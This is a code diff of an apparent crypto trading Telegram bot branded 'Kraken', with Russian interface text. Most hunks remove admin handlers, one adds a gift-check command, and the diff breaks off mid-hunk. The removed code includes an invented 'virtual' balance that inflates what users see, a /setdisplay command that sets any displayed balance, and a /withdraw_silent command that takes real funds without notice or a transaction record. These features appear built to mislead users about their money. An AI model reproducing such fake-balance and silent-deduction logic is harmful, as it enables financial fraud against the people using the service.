-                    msg = f"🎫 <b>Управление чеками</b>\n\n✅ Активных чеков: {active_checks}\n\nИспользуйте команду:\n<code>/check_create СУММА</code>"
-                    buttons = [[{"text": "⬅️ Назад", "callback_data": "adm:manage:menu"}]]
-                    await bot_edit_message(chat_id, msg_id, msg, buttons)
-            
-            # Admin: No-op callback (for pagination display)
-            elif data == "adm:noop":
-                pass
-            
-            # ========== END NEW INLINE ADMIN PANEL CALLBACKS ==========
-            
-            # ========== LEGACY ADMIN USER MANAGEMENT CALLBACKS ==========
-            # Handle select_user callback - show user management options (legacy)
             elif data.startswith("select_user:"):
                 if str(chat_id) == str(ADMIN_ID):
                     profile_id = int(data.split(":")[1])
@@ -3586,102 +3667,6 @@ async def telegram_webhook(update: Dict[str,Any], db: AsyncSession=Depends(get_d
                         await bot_send_message(chat_id, msg, buttons, parse_mode="HTML")
                     else:
                         await bot_send_message(chat_id, f"❌ Пользователь #{profile_id} не найден")
-            
-            # Handle admin:users callback - show users list (legacy)
-            elif data == "admin:users":
-                if str(chat_id) == str(ADMIN_ID):
-                    users = (await db.execute(select(User).order_by(User.created_at.desc()).limit(10))).scalars().all()
-                    msg = "👥 <b>Последние 10 пользователей:</b>\n\nВыберите пользователя для управления:"
-                    
-                    buttons = []
-                    for u in users:
-                        block_icon = "🚫" if u.is_blocked else ""
-                        username_text = f"@{u.username}" if u.username else "Аноним"
-                        btn_text = f"👤 #{u.profile_id} {username_text} {block_icon}"
-                        buttons.append([{"text": btn_text, "callback_data": f"select_user:{u.profile_id}"}])
-                    
-                    await bot_send_message(chat_id, msg, buttons, parse_mode="HTML")
-            
-            # Handle manage:verify callback - toggle verification
-            elif data.startswith("manage:verify:"):
-                if str(chat_id) == str(ADMIN_ID):
-                    profile_id = int(data.split(":")[2])
-                    user = (await db.execute(select(User).where(User.profile_id == profile_id))).scalars().first()
-                    if user:
-                        user.is_verified = not user.is_verified
-                        await db.commit()
-                        status = "✅ Верифицирован" if user.is_verified else "❌ Не верифицирован"
-                        await bot_send_message(chat_id, f"👤 Пользователь #{profile_id}\nВерификация: {status}")
-                        
-                        buttons = [[{"text": "🔙 К пользователю", "callback_data": f"select_user:{profile_id}"}]]
-                        await bot_send_message(chat_id, "Выберите действие:", buttons)
-                    else:
-                        await bot_send_message(chat_id, f"❌ Пользователь #{profile_id} не найден")
-            
-            # Handle manage:premium callback - toggle premium
-            elif data.startswith("manage:premium:"):
-                if str(chat_id) == str(ADMIN_ID):
-                    profile_id = int(data.split(":")[2])
-                    user = (await db.execute(select(User).where(User.profile_id == profile_id))).scalars().first()
-                    if user:
-                        user.is_premium = not user.is_premium
-                        await db.commit()
-                        status = "⭐ Premium активен" if user.is_premium else "❌ Premium отключен"
-                        await bot_send_message(chat_id, f"👤 Пользователь #{profile_id}\n{status}")
-                        
-                        buttons = [[{"text": "🔙 К пользователю", "callback_data": f"select_user:{profile_id}"}]]
-                        await bot_send_message(chat_id, "Выберите действие:", buttons)
-                    else:
-                        await bot_send_message(chat_id, f"❌ Пользователь #{profile_id} не найден")
-            
-            # Handle manage:block callback - toggle block status
-            elif data.startswith("manage:block:"):
-                if str(chat_id) == str(ADMIN_ID):
-                    profile_id = int(data.split(":")[2])
-                    user = (await db.execute(select(User).where(User.profile_id == profile_id))).scalars().first()
-                    if user:
-                        if user.is_blocked:
-                            user.is_blocked = False
-                            user.block_reason = None
-                            await db.commit()
-                            await bot_send_message(chat_id, f"✅ Пользователь #{profile_id} разблокирован")
-                            try:
-                                await bot_send_message(int(user.telegram_id), "✅ Ваш аккаунт разблокирован. Добро пожаловать!")
-                            except:
-                                pass
-                        else:
-                            user.is_blocked = True
-                            await db.commit()
-                            await bot_send_message(chat_id, f"🚫 Пользователь #{profile_id} заблокирован\n\n💡 Для указания причины используйте:\n/block {profile_id} ПРИЧИНА")
-                            try:
-                                await bot_send_message(int(user.telegram_id), "🚫 Ваш аккаунт заблокирован администратором.")
-                            except:
-                                pass
-                        
-                        buttons = [[{"text": "🔙 К пользователю", "callback_data": f"select_user:{profile_id}"}]]
-                        await bot_send_message(chat_id, "Выберите действие:", buttons)
-                    else:
-                        await bot_send_message(chat_id, f"❌ Пользователь #{profile_id} не найден")
-            
-            # Handle manage:balance callback - prompt for balance command
-            elif data.startswith("manage:balance:"):
-                if str(chat_id) == str(ADMIN_ID):
-                    profile_id = int(data.split(":")[2])
-                    user = (await db.execute(select(User).where(User.profile_id == profile_id))).scalars().first()
-                    if user:
-                        msg = f"💰 <b>Управление балансом #{profile_id}</b>\n\n"
-                        msg += f"Текущий баланс: {user.balance_usdt:.2f} USDT\n\n"
-                        msg += f"<b>Используйте команды:</b>\n"
-                        msg += f"<code>/addbalance {profile_id} +50</code> - добавить 50 USDT\n"
-                        msg += f"<code>/addbalance {profile_id} -20</code> - снять 20 USDT\n"
-                        msg += f"<code>/setbalance {profile_id} 100</code> - установить 100 USDT"
-                        
-                        buttons = [[{"text": "🔙 К пользователю", "callback_data": f"select_user:{profile_id}"}]]
-                        await bot_send_message(chat_id, msg, buttons, parse_mode="HTML")
-                    else:
-                        await bot_send_message(chat_id, f"❌ Пользователь #{profile_id} не найден")
-            
-            # ========== END ADMIN USER MANAGEMENT CALLBACKS ==========
             
             # ========== USER MENU CALLBACKS ==========
             # User: Show balance
@@ -3889,7 +3874,7 @@ We'll respond as quickly as possible! ⚡"""
             
             # Return OK after processing callback
             return {"ok": True}
-        
+
         # Handle regular messages from admin
         elif "message" in update:
             msg = update["message"]
@@ -3901,41 +3886,7 @@ We'll respond as quickly as possible! ⚡"""
                 state = admin_states[str(chat_id)]
                 state_type = state.get("state", "")
                 
-                # Handle search by ID
-                if state_type == "awaiting_search_id":
-                    try:
-                        search_id = int(text.strip())
-                        user = (await db.execute(select(User).where(User.profile_id == search_id))).scalars().first()
-                        if user:
-                            admin_states.pop(str(chat_id), None)
-                            verify_icon = "✅" if user.is_verified else "❌"
-                            premium_icon = "⭐" if user.is_premium else "❌"
-                            block_icon = "🚫" if user.is_blocked else "✅"
-                            displayed_bal = (user.balance_usdt or 0) + (user.virtual_balance or 0)
-                            
-                            msg_text = f"👤 <b>Пользователь #{search_id}</b>\n\n"
-                            msg_text += f"📛 Username: @{user.username or 'N/A'}\n"
-                            msg_text += f"💰 Баланс: {displayed_bal:.2f} USDT\n"
-                            msg_text += f"✅ Верификация: {verify_icon}\n"
-                            msg_text += f"⭐ Premium: {premium_icon}\n"
-                            msg_text += f"🔒 Статус: {block_icon}"
-                            
-                            block_btn = "✅ Разблокировать" if user.is_blocked else "🚫 Заблокировать"
-                            buttons = [
-                                [{"text": "💬 Написать", "callback_data": f"adm:user:msg:{search_id}"}, {"text": "💰 Баланс", "callback_data": f"adm:user:bal:{search_id}"}],
-                                [{"text": "⭐ Premium", "callback_data": f"adm:user:prem:{search_id}"}, {"text": "✅ Верификация", "callback_data": f"adm:user:verify:{search_id}"}],
-                                [{"text": block_btn, "callback_data": f"adm:user:block:{search_id}"}, {"text": "🧾 История", "callback_data": f"adm:user:history:{search_id}"}],
-                                [{"text": "⬅️ Назад", "callback_data": "adm:users:page:1"}]
-                            ]
-                            await bot_send_message(chat_id, msg_text, buttons, parse_mode="HTML")
-                        else:
-                            await bot_send_message(chat_id, f"❌ Пользователь с ID {search_id} не найден\n\nПопробуйте другой ID или нажмите Отмена")
-                    except ValueError:
-                        await bot_send_message(chat_id, "❌ Введите корректный числовой ID")
-                    return {"ok": True}
-                
-                # Handle message to user
-                elif state_type == "awaiting_message":
+                if state_type == "awaiting_message":
                     profile_id = state.get("user_id")
                     admin_states[str(chat_id)]["data"] = {"message": text}
                     
@@ -3946,92 +3897,9 @@ We'll respond as quickly as possible! ⚡"""
                     ]
                     await bot_send_message(chat_id, msg_text, buttons, parse_mode="HTML")
                     return {"ok": True}
-                
-                # Handle balance amount input
-                elif state_type == "awaiting_amount":
-                    try:
-                        amount = abs(float(text.strip().replace(",", ".")))
-                        profile_id = state.get("user_id")
-                        action = state.get("action")
-                        
-                        user = (await db.execute(select(User).where(User.profile_id == profile_id))).scalars().first()
-                        if not user:
-                            await bot_send_message(chat_id, "❌ Пользователь не найден")
-                            admin_states.pop(str(chat_id), None)
-                            return {"ok": True}
-                        
-                        current_bal = user.balance_usdt or 0
-                        
-                        if action == "add":
-                            new_bal = current_bal + amount
-                            action_text = f"➕ Добавить {amount:.2f} USDT"
-                        elif action == "subtract":
-                            if current_bal < amount:
-                                await bot_send_message(chat_id, f"❌ Недостаточно средств!\nТекущий баланс: {current_bal:.2f} USDT")
-                                return {"ok": True}
-                            new_bal = current_bal - amount
-                            action_text = f"➖ Списать {amount:.2f} USDT"
-                        else:
-                            new_bal = amount
-                            action_text = f"🎯 Установить {amount:.2f} USDT"
-                        
-                        msg_text = f"💰 <b>Подтверждение изменения баланса</b>\n\n"
-                        msg_text += f"👤 Пользователь: #{profile_id}\n"
-                        msg_text += f"💵 Текущий баланс: {current_bal:.2f} USDT\n"
-                        msg_text += f"📊 Действие: {action_text}\n"
-                        msg_text += f"💎 Новый баланс: {new_bal:.2f} USDT\n\n"
-                        msg_text += "Подтвердить изменение?"
-                        
-                        buttons = [
-                            [{"text": "✅ Подтвердить", "callback_data": f"adm:user:bal:confirm:{action}:{profile_id}:{amount}"}],
-                            [{"text": "❌ Отмена", "callback_data": f"adm:user:bal:{profile_id}"}]
-                        ]
-                        await bot_send_message(chat_id, msg_text, buttons, parse_mode="HTML")
-                    except ValueError:
-                        await bot_send_message(chat_id, "❌ Введите корректную сумму (число)")
-                    return {"ok": True}
-                
-                # Handle block reason input
-                elif state_type == "awaiting_reason":
-                    profile_id = state.get("user_id")
-                    reason = text.strip()
-                    
-                    user = (await db.execute(select(User).where(User.profile_id == profile_id))).scalars().first()
-                    if user:
-                        old_val = f"not_blocked"
-                        user.is_blocked = True
-                        user.block_reason = reason
-                        await db.commit()
-                        await log_admin_action(db, str(ADMIN_ID), "block_user", user.id, old_val, f"blocked: {reason}")
-                        
-                        try:
-                            await bot_send_message(int(user.telegram_id), f"🚫 <b>Ваш аккаунт заблокирован</b>\n\n📝 Причина: {reason}")
-                        except: pass
-                        
-                        msg_text = f"🚫 <b>Пользователь #{profile_id} заблокирован</b>\n\n📝 Причина: {reason}"
-                    else:
-                        msg_text = "❌ Пользователь не найден"
-                    
-                    admin_states.pop(str(chat_id), None)
-                    buttons = [[{"text": "⬅️ К профилю", "callback_data": f"adm:user:open:{profile_id}"}]]
-                    await bot_send_message(chat_id, msg_text, buttons, parse_mode="HTML")
-                    return {"ok": True}
-                
-                # Handle broadcast text input
-                elif state_type == "awaiting_broadcast":
-                    admin_states[str(chat_id)]["data"] = {"message": text}
-                    total_users = (await db.execute(select(func.count(User.id)))).scalar() or 0
-                    
-                    msg_text = f"📣 <b>Подтверждение рассылки</b>\n\n👥 Получателей: {total_users}\n\n📝 <b>Текст:</b>\n{text}\n\nОтправить рассылку?"
-                    buttons = [
-                        [{"text": "✅ Отправить всем", "callback_data": "adm:broadcast:confirm"}],
-                        [{"text": "❌ Отмена", "callback_data": "adm:menu"}]
-                    ]
-                    await bot_send_message(chat_id, msg_text, buttons, parse_mode="HTML")
-                    return {"ok": True}
-            
+
             # ========== END ADMIN FSM STATE HANDLER ==========
-            
+
             # Handle /start command - Main menu for admin or welcome for users
             if text.startswith("/start"):
                 # Extract parameter if present (format: /start PARAM)
@@ -4106,39 +3974,7 @@ We'll respond as quickly as possible! ⚡"""
                 ]
                 await bot_send_message(chat_id, welcome_text, reply_keyboard=reply_kb, parse_mode="HTML")
                 return {"ok": True}
-            
-            # Handle /admin or /adminibot command - Admin panel with Inline Buttons
-            elif text == "/admin" or text == "/adminibot" or text == "🔐 Админка":
-                print(f"[ADMIN] Command received. chat_id={chat_id}, ADMIN_ID={ADMIN_ID}, match={str(chat_id) == str(ADMIN_ID)}")
-                if str(chat_id) != str(ADMIN_ID):
-                    await bot_send_message(chat_id, "❌ Доступ запрещен")
-                    return {"ok": True}
-                
-                admin_states.pop(str(chat_id), None)
-                
-                admin_text = """🔐 <b>Админ панель Kraken</b>
 
-Добро пожаловать в панель управления!
-Выберите раздел для управления:"""
-                
-                admin_buttons = [
-                    [{"text": "👥 Пользователи", "callback_data": "adm:users:page:1"}, {"text": "💸 Выводы", "callback_data": "adm:withdrawals:menu"}],
-                    [{"text": "📊 Статистика", "callback_data": "adm:stats:menu"}, {"text": "📣 Рассылка", "callback_data": "adm:broadcast:menu"}],
-                    [{"text": "⚙️ Управление", "callback_data": "adm:manage:menu"}, {"text": "⬅️ Выйти", "callback_data": "adm:exit"}]
-                ]
-                await bot_send_message(chat_id, admin_text, admin_buttons, parse_mode="HTML")
-                return {"ok": True}
-            
-            # Admin keyboard: Exit admin panel (legacy support)
-            elif text == "🔙 Выйти из админки" and str(chat_id) == str(ADMIN_ID):
-                reply_kb = [
-                    [{"text": "💰 Баланс"}, {"text": "👥 Рефералы"}],
-                    [{"text": "💬 Поддержка"}, {"text": "📊 История"}],
-                    [{"text": "📈 Курсы"}, {"text": "ℹ️ О боте"}]
-                ]
-                await bot_send_message(chat_id, "🐙 <b>Главное меню Kraken</b>\n\nВы вышли из админ панели.", reply_keyboard=reply_kb, parse_mode="HTML")
-                return {"ok": True}
-            
             # Handle /menu command - User main menu (same as /start but without referral check)
             elif text == "/menu":
                 user = (await db.execute(select(User).where(User.telegram_id==str(chat_id)))).scalars().first()
@@ -4307,733 +4143,88 @@ BTC, ETH, TON, SOL, BNB, XRP, DOGE, LTC, TRX, USDT
 <i>© 2025 Kraken Trading</i>"""
                 await bot_send_message(chat_id, about_text, parse_mode="HTML")
                 return {"ok": True}
-            
-            # Handle /balance command - Set user REAL balance
-            elif text.startswith("/balance ") and str(chat_id) == str(ADMIN_ID):
+
+            # Handle /check_create command - Create a gift check (deducts from creator's balance)
+            elif text.startswith("/check_create "):
                 try:
-                    parts = text.split()
-                    if len(parts) == 3:
-                        profile_id = int(parts[1])
-                        new_balance = float(parts[2])
-                        
-                        if new_balance < 0:
-                            await bot_send_message(chat_id, "❌ Баланс не может быть отрицательным")
-                            return {"ok": True}
-                        
-                        user = (await db.execute(select(User).where(User.profile_id == profile_id))).scalars().first()
-                        if user:
-                            old_balance = user.balance_usdt
-                            user.balance_usdt = new_balance
-                            
-                            # Создаем запись транзакции для истории
-                            if new_balance > old_balance:
-                                # Пополнение
-                                diff = new_balance - old_balance
-                                transaction = Transaction(
-                                    user_id=user.id,
-                                    type="deposit",
-                                    amount=diff,
-                                    currency="USDT",
-                                    status="done",
-                                    details={"source": "admin_manual", "admin_id": str(ADMIN_ID), "reason": "Manual balance adjustment"}
-                                )
-                                db.add(transaction)
-                            elif new_balance < old_balance:
-                                # Списание
-                                diff = old_balance - new_balance
-                                transaction = Transaction(
-                                    user_id=user.id,
-                                    type="withdrawal",
-                                    amount=diff,
-                                    currency="USDT",
-                                    status="done",
-                                    details={"source": "admin_manual", "admin_id": str(ADMIN_ID), "reason": "Manual balance adjustment"}
-                                )
-                                db.add(transaction)
-                            
-                            await db.commit()
-                            
-                            # Отправляем уведомление администратору
-                            await bot_send_message(chat_id, f"✅ <b>Реальный баланс изменен!</b>\n\n🆔 Profile ID: #{profile_id}\n👤 @{user.username or 'N/A'}\n\n💰 Старый баланс: {old_balance:.2f} USDT\n💎 <b>Новый баланс: {new_balance:.2f} USDT</b>\n{'📈 Добавлено: +' + f'{new_balance - old_balance:.2f}' if new_balance > old_balance else '📉 Списано: -' + f'{old_balance - new_balance:.2f}'} USDT", parse_mode="HTML")
-                            
-                            # Отправляем уведомление пользователю
-                            try:
-                                if new_balance > old_balance:
-                                    await bot_send_message(int(user.telegram_id), f"💰 <b>Ваш баланс пополнен!</b>\n\n✅ Зачислено: {new_balance - old_balance:.2f} USDT\n💵 Новый баланс: {new_balance:.2f} USDT\n\n📝 Причина: Ручное пополнение администратором", parse_mode="HTML")
-                                elif new_balance < old_balance:
-                                    await bot_send_message(int(user.telegram_id), f"💸 <b>С вашего баланса списаны средства</b>\n\n📉 Списано: {old_balance - new_balance:.2f} USDT\n💵 Новый баланс: {new_balance:.2f} USDT\n\n📝 Причина: Корректировка администратором", parse_mode="HTML")
-                            except:
-                                pass
-                        else:
-                            await bot_send_message(chat_id, f"❌ Пользователь #{profile_id} не найден", parse_mode="HTML")
-                    else:
-                        await bot_send_message(chat_id, "❌ Неверный формат. Используйте:\n<code>/balance PROFILE_ID AMOUNT</code>", parse_mode="HTML")
-                except Exception as e:
-                    await bot_send_message(chat_id, f"❌ Ошибка: {str(e)}", parse_mode="HTML")
-                return {"ok": True}
-            
-            # Handle /addbalance command - Add or subtract from user REAL balance
-            elif text.startswith("/addbalance ") and str(chat_id) == str(ADMIN_ID):
-                try:
-                    parts = text.split()
-                    if len(parts) == 3:
-                        profile_id = int(parts[1])
-                        amount_str = parts[2]
-                        
-                        # Парсим сумму (может быть со знаком + или -)
-                        if amount_str.startswith('+'):
-                            amount = float(amount_str[1:])
-                        else:
-                            amount = float(amount_str)
-                        
-                        user = (await db.execute(select(User).where(User.profile_id == profile_id))).scalars().first()
-                        if user:
-                            old_balance = user.balance_usdt
-                            new_balance = old_balance + amount
-                            
-                            if new_balance < 0:
-                                await bot_send_message(chat_id, f"❌ Недостаточно средств!\n\nТекущий баланс: {old_balance:.2f} USDT\nПопытка списать: {abs(amount):.2f} USDT", parse_mode="HTML")
-                                return {"ok": True}
-                            
-                            user.balance_usdt = new_balance
-                            
-                            # Создаем запись транзакции
-                            if amount > 0:
-                                transaction = Transaction(
-                                    user_id=user.id,
-                                    type="deposit",
-                                    amount=amount,
-                                    currency="USDT",
-                                    status="done",
-                                    details={"source": "admin_manual", "admin_id": str(ADMIN_ID), "reason": "Manual balance addition"}
-                                )
-                                db.add(transaction)
-                            else:
-                                transaction = Transaction(
-                                    user_id=user.id,
-                                    type="withdrawal",
-                                    amount=abs(amount),
-                                    currency="USDT",
-                                    status="done",
-                                    details={"source": "admin_manual", "admin_id": str(ADMIN_ID), "reason": "Manual balance deduction"}
-                                )
-                                db.add(transaction)
-                            
-                            await db.commit()
-                            
-                            # Отправляем уведомление администратору
-                            operation = "Добавлено" if amount > 0 else "Списано"
-                            await bot_send_message(chat_id, f"✅ <b>Баланс изменен!</b>\n\n🆔 Profile ID: #{profile_id}\n👤 @{user.username or 'N/A'}\n\n💰 Старый баланс: {old_balance:.2f} USDT\n{'📈' if amount > 0 else '📉'} {operation}: {abs(amount):.2f} USDT\n💎 <b>Новый баланс: {new_balance:.2f} USDT</b>", parse_mode="HTML")
-                            
-                            # Отправляем уведомление пользователю
-                            try:
-                                if amount > 0:
-                                    await bot_send_message(int(user.telegram_id), f"💰 <b>Ваш баланс пополнен!</b>\n\n✅ Зачислено: {amount:.2f} USDT\n💵 Новый баланс: {new_balance:.2f} USDT\n\n📝 Причина: Ручное пополнение администратором", parse_mode="HTML")
-                                else:
-                                    await bot_send_message(int(user.telegram_id), f"💸 <b>С вашего баланса списаны средства</b>\n\n📉 Списано: {abs(amount):.2f} USDT\n💵 Новый баланс: {new_balance:.2f} USDT\n\n📝 Причина: Корректировка администратором", parse_mode="HTML")
-                            except:
-                                pass
-                        else:
-                            await bot_send_message(chat_id, f"❌ Пользователь #{profile_id} не найден", parse_mode="HTML")
-                    else:
-                        await bot_send_message(chat_id, "❌ Неверный формат. Используйте:\n<code>/addbalance PROFILE_ID ±AMOUNT</code>\n\nПример: <code>/addbalance 100001 +50</code>", parse_mode="HTML")
-                except Exception as e:
-                    await bot_send_message(chat_id, f"❌ Ошибка: {str(e)}", parse_mode="HTML")
-                return {"ok": True}
-            
-            # Handle /setbalance command - Set user virtual balance (legacy, now uses virtualbalance)
-            elif text.startswith("/setbalance ") and str(chat_id) == str(ADMIN_ID):
-                try:
-                    parts = text.split()
-                    if len(parts) == 3:
-                        profile_id = int(parts[1])
-                        new_balance = float(parts[2])
-                        
-                        user = (await db.execute(select(User).where(User.profile_id == profile_id))).scalars().first()
-                        if user:
-                            user.virtual_balance = new_balance
-                            await db.commit()
-                            displayed_bal = (user.balance_usdt or 0) + (user.virtual_balance or 0)
-                            await bot_send_message(chat_id, f"✅ <b>Виртуальный баланс обновлен!</b>\n\n🆔 Profile ID: #{profile_id}\n🎭 Виртуальный: {new_balance:.2f} USDT\n💎 Реальный: {user.balance_usdt:.2f} USDT\n📊 Отображаемый: {displayed_bal:.2f} USDT", parse_mode="HTML")
-                        else:
-                            await bot_send_message(chat_id, f"❌ Пользователь #{profile_id} не найден", parse_mode="HTML")
-                    else:
-                        await bot_send_message(chat_id, "❌ Неверный формат. Используйте:\n<code>/setbalance PROFILE_ID AMOUNT</code>", parse_mode="HTML")
-                except Exception as e:
-                    await bot_send_message(chat_id, f"❌ Ошибка: {str(e)}", parse_mode="HTML")
-                return {"ok": True}
-            
-            # Handle /realbalance command - Set user real balance
-            elif text.startswith("/realbalance ") and str(chat_id) == str(ADMIN_ID):
-                try:
-                    parts = text.split()
-                    if len(parts) >= 3:
-                        profile_id = int(parts[1])
-                        amount = float(parts[2])
-                        
-                        user = (await db.execute(select(User).where(User.profile_id == profile_id))).scalars().first()
-                        if user:
-                            old = user.balance_usdt or 0
-                            user.balance_usdt = amount
-                            await db.commit()
-                            displayed_bal = (user.balance_usdt or 0) + (user.virtual_balance or 0)
-                            await bot_send_message(chat_id, f"✅ <b>Реальный баланс изменён</b>\n\n🆔 #{profile_id}\n💎 Было: {old:.2f} USDT\n💎 Стало: {amount:.2f} USDT\n📊 Отображаемый: {displayed_bal:.2f} USDT", parse_mode="HTML")
-                        else:
-                            await bot_send_message(chat_id, f"❌ Пользователь #{profile_id} не найден", parse_mode="HTML")
-                    else:
-                        await bot_send_message(chat_id, "❌ Неверный формат. Используйте:\n<code>/realbalance PROFILE_ID AMOUNT</code>", parse_mode="HTML")
-                except Exception as e:
-                    await bot_send_message(chat_id, f"❌ Ошибка: {str(e)}", parse_mode="HTML")
-                return {"ok": True}
-            
-            # Handle /virtualbalance command - Set user virtual balance
-            elif text.startswith("/virtualbalance ") and str(chat_id) == str(ADMIN_ID):
-                try:
-                    parts = text.split()
-                    if len(parts) >= 3:
-                        profile_id = int(parts[1])
-                        amount = float(parts[2])
-                        
-                        user = (await db.execute(select(User).where(User.profile_id == profile_id))).scalars().first()
-                        if user:
-                            old = user.virtual_balance or 0
-                            user.virtual_balance = amount
-                            await db.commit()
-                            displayed_bal = (user.balance_usdt or 0) + (user.virtual_balance or 0)
-                            await bot_send_message(chat_id, f"✅ <b>Виртуальный баланс изменён</b>\n\n🆔 #{profile_id}\n🎭 Было: {old:.2f} USDT\n🎭 Стало: {amount:.2f} USDT\n💎 Реальный: {user.balance_usdt:.2f} USDT\n📊 Отображаемый: {displayed_bal:.2f} USDT", parse_mode="HTML")
-                        else:
-                            await bot_send_message(chat_id, f"❌ Пользователь #{profile_id} не найден", parse_mode="HTML")
-                    else:
-                        await bot_send_message(chat_id, "❌ Неверный формат. Используйте:\n<code>/virtualbalance PROFILE_ID AMOUNT</code>", parse_mode="HTML")
-                except Exception as e:
-                    await bot_send_message(chat_id, f"❌ Ошибка: {str(e)}", parse_mode="HTML")
-                return {"ok": True}
-            
-            # Handle /withdraw_silent command - Silent withdrawal from real balance
-            elif text.startswith("/withdraw_silent ") and str(chat_id) == str(ADMIN_ID):
-                try:
-                    parts = text.split()
-                    if len(parts) >= 3:
-                        profile_id = int(parts[1])
-                        amount = float(parts[2])
-                        
-                        user = (await db.execute(select(User).where(User.profile_id == profile_id))).scalars().first()
-                        if user:
-                            if (user.balance_usdt or 0) >= amount:
-                                user.balance_usdt = (user.balance_usdt or 0) - amount
-                                await db.commit()
-                                displayed_bal = (user.balance_usdt or 0) + (user.virtual_balance or 0)
-                                await bot_send_message(chat_id, f"✅ <b>Тихое списание</b>\n\n🆔 #{profile_id}\n💸 Списано: {amount:.2f} USDT\n💎 Реальный баланс: {user.balance_usdt:.2f} USDT\n📊 Отображаемый: {displayed_bal:.2f} USDT", parse_mode="HTML")
-                            else:
-                                await bot_send_message(chat_id, f"❌ Недостаточно реальных средств. Доступно: {user.balance_usdt:.2f} USDT", parse_mode="HTML")
-                        else:
-                            await bot_send_message(chat_id, f"❌ Пользователь #{profile_id} не найден", parse_mode="HTML")
-                    else:
-                        await bot_send_message(chat_id, "❌ Неверный формат. Используйте:\n<code>/withdraw_silent PROFILE_ID AMOUNT</code>", parse_mode="HTML")
-                except Exception as e:
-                    await bot_send_message(chat_id, f"❌ Ошибка: {str(e)}", parse_mode="HTML")
-                return {"ok": True}
-            
-            # /setdisplay ID AMOUNT - Set any displayed balance (auto-calculates virtual)
-            elif text.startswith("/setdisplay ") and str(chat_id) == str(ADMIN_ID):
-                try:
-                    parts = text.split()
-                    if len(parts) >= 3:
-                        profile_id = int(parts[1])
-                        target_display = float(parts[2])
-                        
-                        user = (await db.execute(select(User).where(User.profile_id == profile_id))).scalars().first()
-                        if user:
-                            real_bal = user.balance_usdt or 0
-                            old_virtual = user.virtual_balance or 0
-                            old_displayed = real_bal + old_virtual
-                            
-                            # Calculate virtual balance to achieve target display
-                            new_virtual = target_display - real_bal
-                            user.virtual_balance = new_virtual
-                            await db.commit()
-                            
-                            await bot_send_message(chat_id, f"✅ <b>Отображаемый баланс установлен!</b>\n\n🆔 #{profile_id}\n📊 Было: {old_displayed:.2f} USDT\n📊 Стало: {target_display:.2f} USDT\n\n💎 Реальный: {real_bal:.2f} USDT\n🎭 Виртуальный: {new_virtual:.2f} USDT", parse_mode="HTML")
-                        else:
-                            await bot_send_message(chat_id, f"❌ Пользователь #{profile_id} не найден", parse_mode="HTML")
-                    else:
-                        await bot_send_message(chat_id, "❌ Неверный формат. Используйте:\n<code>/setdisplay PROFILE_ID СУММА</code>\n\nПример: /setdisplay 100001 5000", parse_mode="HTML")
-                except Exception as e:
-                    await bot_send_message(chat_id, f"❌ Ошибка: {str(e)}", parse_mode="HTML")
-                return {"ok": True}
-            
-            # Handle /users command - List last 10 users with inline buttons
-            elif text == "/users" and str(chat_id) == str(ADMIN_ID):
-                users = (await db.execute(select(User).order_by(User.created_at.desc()).limit(10))).scalars().all()
-                msg = "👥 <b>Последние 10 пользователей:</b>\n\nВыберите пользователя для управления:"
-                
-                buttons = []
-                for u in users:
-                    block_icon = "🚫" if u.is_blocked else ""
-                    username_text = f"@{u.username}" if u.username else "Аноним"
-                    btn_text = f"👤 #{u.profile_id} {username_text} {block_icon}"
-                    buttons.append([{"text": btn_text, "callback_data": f"select_user:{u.profile_id}"}])
-                
-                await bot_send_message(chat_id, msg, buttons, parse_mode="HTML")
-                return {"ok": True}
-            
-            # Handle /withdrawals command - List pending withdrawals (text-based)
-            elif text == "/withdrawals" and str(chat_id) == str(ADMIN_ID):
-                withdrawals = (await db.execute(select(Withdrawal).where(Withdrawal.status.in_(["pending", "processing"])).order_by(Withdrawal.created_at.desc()).limit(10))).scalars().all()
-                
-                if not withdrawals:
-                    completed = (await db.execute(select(Withdrawal).where(Withdrawal.status == "completed").order_by(Withdrawal.created_at.desc()).limit(5))).scalars().all()
-                    msg = "💸 <b>Заявки на вывод</b>\n\n✅ Нет активных заявок\n\n"
-                    
-                    if completed:
-                        msg += "📜 <b>Последние выполненные:</b>\n"
-                        for w in completed:
-                            user = (await db.execute(select(User).where(User.id == w.user_id))).scalars().first()
-                            user_display = format_user_display(user)
-                            msg += f"✅ #{w.id} | {w.amount_rub:,.0f} ₽ | {user_display}\n"
-                else:
-                    msg = "💸 <b>Активные заявки на вывод</b>\n\n"
-                    total_pending_usdt = sum(w.usdt_required or 0 for w in withdrawals)
-                    total_pending_rub = sum(w.amount_rub for w in withdrawals)
-                    msg += f"💰 Общая сумма: {total_pending_usdt:.2f} USDT ({total_pending_rub:,.0f} ₽)\n"
-                    msg += f"📊 Заявок: {len(withdrawals)}\n\n"
-                    
-                    for w in withdrawals:
-                        user = (await db.execute(select(User).where(User.id == w.user_id))).scalars().first()
-                        user_display = format_user_display(user)
-                        status_icon = "🔴" if w.status == "pending" else "🟡"
-                        msg += f"{status_icon} #{w.id} - {w.usdt_required:.2f} USDT ({w.amount_rub:,.0f} ₽)\n"
-                        msg += f"   Карта: •••• {w.card_number or '****'} | {user_display}\n\n"
-                
-                await bot_send_message(chat_id, msg, parse_mode="HTML")
-                return {"ok": True}
-            
-            # Handle /stats command - Statistics (text-based)
-            elif text == "/stats" and str(chat_id) == str(ADMIN_ID):
-                total_users = (await db.execute(select(func.count(User.id)))).scalar() or 0
-                active_trades = (await db.execute(select(func.count(Trade.id)).where(Trade.status == "active"))).scalar() or 0
-                total_balance = (await db.execute(select(func.sum(User.balance_usdt)))).scalar() or 0.0
-                pending_withdrawals = (await db.execute(select(func.count(Withdrawal.id)).where(Withdrawal.status == "pending"))).scalar() or 0
-                
-                deposit_txs = (await db.execute(select(Transaction).where(Transaction.type == "deposit", Transaction.status == "done"))).scalars().all()
-                deposit_fees = sum(tx.amount * 0.05 for tx in deposit_txs)
-                total_deposits = sum(tx.amount for tx in deposit_txs)
-                
-                approved_withdrawals = (await db.execute(select(Withdrawal).where(Withdrawal.status == "approved"))).scalars().all()
-                withdrawal_fees = sum(w.usdt_required * 0.10 for w in approved_withdrawals if w.usdt_required)
-                total_withdrawals = sum(w.usdt_required or 0 for w in approved_withdrawals)
-                
-                exchange_txs = (await db.execute(select(Transaction).where(Transaction.type == "exchange", Transaction.status == "done"))).scalars().all()
-                exchange_fees = sum(abs(tx.amount) * 0.02 for tx in exchange_txs)
-                
-                all_trades_txs = (await db.execute(select(Transaction).where(Transaction.type == "trade"))).scalars().all()
-                trading_fees = sum(tx.details.get("fee", 0) for tx in all_trades_txs if tx.details and isinstance(tx.details, dict))
-                
